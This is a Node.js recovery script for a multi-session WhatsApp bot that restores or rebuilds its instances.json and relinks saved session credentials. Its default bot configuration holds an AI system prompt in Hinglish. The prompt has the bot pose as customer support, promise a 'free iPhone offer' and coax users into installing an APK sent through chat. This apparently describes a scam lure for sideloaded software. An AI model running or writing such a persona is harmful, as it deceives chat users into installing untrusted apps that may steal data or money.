#!/usr/bin/env node
'use strict';

/**
 * Emergency Recovery Tool for WhatsApp Bot instances.json
 * Reconstructs or repairs corrupted instances.json from .bak or .wwebjs_auth directory.
 */

const fs = require('fs');
const path = require('path');

const dataDir = path.join(__dirname, 'data');
const authDir = path.join(__dirname, '.wwebjs_auth');
const instancesPath = path.join(dataDir, 'instances.json');
const instancesBakPath = path.join(dataDir, 'instances.json.bak');

console.log('=============================================================');
console.log('🛠️  WHATSAPP BOT INSTANCES DATABASE RECOVERY TOOL');
console.log('=============================================================');

if (!fs.existsSync(dataDir)) {
  fs.mkdirSync(dataDir, { recursive: true });
}

let instances = null;

// 1. Try parsing current instances.json
if (fs.existsSync(instancesPath)) {
  try {
    const raw = fs.readFileSync(instancesPath, 'utf8').trim();
    if (raw) {
      instances = JSON.parse(raw);
      console.log('✅ Current instances.json is valid JSON.');
    }
  } catch (err) {
    console.warn(`⚠️  Current instances.json is corrupted: ${err.message}`);
  }
}

// 2. Try restoring from backup (.bak) if corrupted or missing
if (!instances && fs.existsSync(instancesBakPath)) {
  try {
    const rawBak = fs.readFileSync(instancesBakPath, 'utf8').trim();
    if (rawBak) {
      instances = JSON.parse(rawBak);
      console.log('✅ Found valid backup in instances.json.bak! Restoring...');
    }
  } catch (err) {
    console.warn(`⚠️  Backup instances.json.bak could not be parsed: ${err.message}`);
  }
}

// 3. If still null or empty, create base primary instance
if (!instances || !Array.isArray(instances) || instances.length === 0) {
  console.log('ℹ️  Rebuilding primary bot instance from scratch...');
  instances = [{
    id: `inst_${Date.now()}`,
    name: 'Primary Bot',
    slug: 'primary',
    aiEnabled: true,
    aiSystemPrompt: `Aap ek friendly, helpful aur polite WhatsApp customer support executive hain jo users ko One Shop app download karne aur free iPhone offer claim karne mein guide karte hain.`,
    aiProcessReply: `📱 Free iPhone claim karne ke liye official app install karein.`,
    aiApkInstructions: `Jab bhi user app mangta hai to pyaar se download karne ko kahein aur [SEND_APK] tag lagayein.`,
    aiApkPreamble: `Ye lijiye official app! Ise download karke install karein. 📲`,
    aiSmartApkEnabled: true,
    sessions: [],
    activeSessionId: 'default',
    createdAt: new Date().toISOString()
  }];
}

// 4. Scan .wwebjs_auth for any existing session credentials on the machine
const primary = instances.find(i => i.slug === 'primary') || instances[0];
if (!Array.isArray(primary.sessions)) primary.sessions = [];

let recoveredCount = 0;
if (fs.existsSync(authDir)) {
  const folders = fs.readdirSync(authDir);
  console.log(`🔍 Inspecting ${folders.length} credential folder(s) in .wwebjs_auth...`);

  for (const f of folders) {
    const prefix = `session-session_${primary.slug}`;
    if (f === prefix) {
      let def = primary.sessions.find(s => s.id === 'default');
      if (!def) {
        primary.sessions.unshift({
          id: 'default',
          phone: '',
          label: 'Main number',
          status: 'linked',
          addedAt: new Date().toISOString()
        });
        recoveredCount++;
        console.log('   ➕ Recovered default session from credentials.');
      } else {
        def.status = 'linked';
      }
    } else if (f.startsWith(`${prefix}_`)) {
      const sid = f.slice(`${prefix}_`.length);
      let existing = primary.sessions.find(s => s.id === sid);
      if (!existing) {
        primary.sessions.push({
          id: sid,
          phone: '',
          label: `Session ${sid}`,
          status: 'linked',
          addedAt: new Date().toISOString()
        });
        recoveredCount++;
        console.log(`   ➕ Recovered session "${sid}" from credentials.`);
      } else {
        existing.status = 'linked';
      }
    }
  }
}

if (!primary.activeSessionId || !primary.sessions.some(s => s.id === primary.activeSessionId)) {
  primary.activeSessionId = primary.sessions[0]?.id || 'default';
}

// Write repaired instances.json atomically
const tempFile = `${instancesPath}.tmp.${Date.now()}`;
fs.writeFileSync(tempFile, JSON.stringify(instances, null, 2), 'utf8');
fs.renameSync(tempFile, instancesPath);

console.log('=============================================================');
console.log(`🎉 RECOVERY COMPLETE!`);
console.log(`📁 Saved valid instances database to: ${instancesPath}`);
console.log(`🔢 Active sessions in primary bot: ${primary.sessions.length} (${recoveredCount} newly discovered from .wwebjs_auth)`);
console.log(`👉 You can now restart your bot with: pm2 restart bot`);
console.log('=============================================================');
